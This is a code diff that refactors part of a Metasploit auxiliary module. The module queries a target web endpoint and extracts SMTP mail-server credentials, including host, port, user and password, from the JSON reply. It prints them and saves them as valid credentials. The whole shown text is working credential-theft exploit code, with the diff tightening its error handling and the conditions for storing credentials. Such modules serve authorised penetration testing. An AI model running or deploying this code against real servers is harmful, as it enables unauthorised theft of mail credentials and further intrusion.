@@ -91,31 +91,28 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'get')
     })
 
-    if res&.code == 200
-      print_good('Mail server credentials retrieved:')
+    fail_with(Failure::Unknown, 'No response from server.') if res.nil?
+    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server.') if res.code != 200
+    print_good('Mail server credentials retrieved:')
+    data = res.get_json_document
 
-      if res.body && !res.body.empty?
-        data = JSON.parse(res.body)
-        if data.key?('smtp') && data['smtp'].is_a?(Hash)
-          smtp_info = data['smtp']
+    if data.key?('smtp') && data['smtp'].is_a?(Hash)
+      smtp_info = data['smtp']
 
-          host = smtp_info.fetch('host', 'Unknown Host')
-          port = smtp_info.fetch('port', 'Unknown Port')
-          auth = smtp_info.fetch('auth', 'Unknown Auth')
-          user = smtp_info.fetch('user', 'Unknown User')
-          passw = smtp_info.fetch('pass', 'Unknown Password')
+      host = smtp_info.fetch('host', 'Unknown Host')
+      port = smtp_info.fetch('port', 'Unknown Port')
+      auth = smtp_info.fetch('auth', 'Unknown Auth')
+      user = smtp_info.fetch('user', 'Unknown User')
+      passw = smtp_info.fetch('pass', 'Unknown Password')
 
-          print_good("Host: #{host}")
-          print_good("Port: #{port}")
-          print_good("Auth Type: #{auth}")
-          print_good("User: #{user}")
-          print_good("Password: #{passw}")
+      print_good("Host: #{host}")
+      print_good("Port: #{port}")
+      print_good("Auth Type: #{auth}")
+      print_good("User: #{user}")
+      print_good("Password: #{passw}")
 
-          store_valid_credential(user: user, private: passw, proof: data.to_s)
-        end
-      else
-        print_error('Unexpected or no reply received.')
-        print_status(res.body)
+      unless user == 'Unknown User' || passw == 'Unknown Password'
+        store_valid_credential(user: user, private: passw, proof: data.to_s)
       end
     end
   end
